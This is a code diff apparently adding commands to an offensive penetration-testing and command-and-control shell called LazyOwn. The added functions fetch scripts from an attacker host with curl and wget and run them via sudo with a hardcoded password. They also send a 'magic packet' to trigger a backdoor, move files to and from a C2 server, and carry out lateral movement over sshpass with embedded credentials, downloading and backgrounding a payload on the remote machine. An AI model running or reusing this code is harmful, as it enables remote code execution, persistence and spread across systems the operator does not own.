+        except Exception as e:
+            print_error(f"Failed to create service file: {e}")
+            return
+
+        password = 'grisgrisgris'    
+        cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
+        print_msg(f"Run the following command to enable and start the service:")
+        self.onecmd(f"ssh_cmd {cmd}")
+
+    def do_toctoc(self, line):
+        """
+        Sends a magic packet to the Chinese malware.
+        The function extracts rhost and rport from self.params["rhost"] and self.params["rport"], respectively.
+        """
+        rhost = self.params.get("rhost")
+        rport = self.params.get("rport")
+
+        if not rhost or not rport:
+            raise ValueError("rhost and rport must be specified in params")
+        
+        try:
+            rport = int(rport)
+        except ValueError:
+            raise ValueError("rport must be an integer")
+
+        magic_packet = struct.pack('!I4sH14s', 0xDEADBEEF, socket.inet_aton(rhost), rport, b'justforfun')
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.sendto(magic_packet, (rhost, rport))
+
+        print(f"Magic packet sent to {rhost}:{rport}")
+    
+    def do_upload_c2(self, line):
+        """
+        Upload a file to the command and control (C2) server.
+
+        This function handles the uploading of a file to the C2 server. If no file is specified in the input line,
+        it prompts the user to enter the file extension (defaulting to 'txt') and retrieves the file using the
+        `get_users_dic` function. If a file is specified in the input line, it directly uploads that file.
+
+        Args:
+            line (str): The input line containing the file path to upload. If empty, the function will prompt the user
+                        to enter the file extension.
+
+        Returns:
+            None
+        """        
+        if not line:
+            extension = input("Enter the extension of file to upload: default txt ") or 'txt'
+            file_up = get_users_dic(extension)
+        else:
+            file_up = line.strip()
+        self.upload_file_to_c2(file_up)
+        return
+    
+    def do_download_c2(self, line):
+        """
+        Download a file from the command and control (C2) server.
+
+        This function handles the downloading of a file from the C2 server. It requires the remote path of the file to be specified in the input line. If the input line is empty, it prints an error message and returns.
+
+        Args:
+            line (str): The input line containing the remote path of the file to download. If empty, the function will print an error message.
+
+        Returns:
+            None
+        """        
+        if not line:
+            print_error("Need pass the remote path to file to use this command example: download_c2 /root/root.txt")
+            return
+        self.download_file_from_c2(line)
+        return
+    
+    def do_lateral_mov_lin(self, line):
+        """
+        Perform lateral movement by downloading and installing LazyOwn on a remote Linux machine.
+
+        This function automates the process of setting up an APT and PIP proxy, downloading the LazyOwn package,
+        transferring it to a remote machine, and installing it. The function ensures that all necessary directories
+        are created and that the package is correctly installed on the remote machine.
+
+        Parameters:
+            line (str): The command line input, which is not used in this function.
+
+        Returns:
+            None
+        """
+        
+        print_error("Downloading LazyOwn" + self.url_download)
+
+        version = self.version.replace("/","-")
+        name = f"LazyOwn_CRIMEN.tar.gz"
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        tmp = "/tmp/lazyown_atomic_test"
+        self.cmd(f"mkdir -p {tmp}")
+        sessions = f"{self.path}/sessions/"
+        self.onecmd("apt_proxy remote")
+        self.onecmd("pip_proxy remote")        
+        if not os.path.exists(f"{sessions}/{name}"):
+            command = f"cd {sessions} && wget -O {name} --header='Accept: application/gzip' {self.url_download}"
+            self.cmd(command)
+        command_remote = f"wget -O {name} http://{lhost}/{name}"
+        username = "grisun0"
+        password = "grisgrisgris"
+        ssh = f"""sshpass -p '{password}' ssh {username}@{rhost} '
+        mkdir -p {tmp} ;
+        cd {tmp} ;
+        {command_remote} ;
+        if [ ! -s {name} ]; then echo "Error: File is empty"; exit 1; fi ;
+        tar -vzxf {name} ;
+        echo "{password}" | sudo -S curl http://{lhost}/r -o r ;
+        sh r &'
+        """
+        self.cmd(ssh)
+        ssh_install = f"sshpass -p '{password}' ssh {username}@{rhost} 'cd {tmp}/LazyOwn-{version} ; echo \"{password}\" | sudo -S bash install.sh &'"
+        self.cmd(ssh_install)
+        return
+
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("check_update")
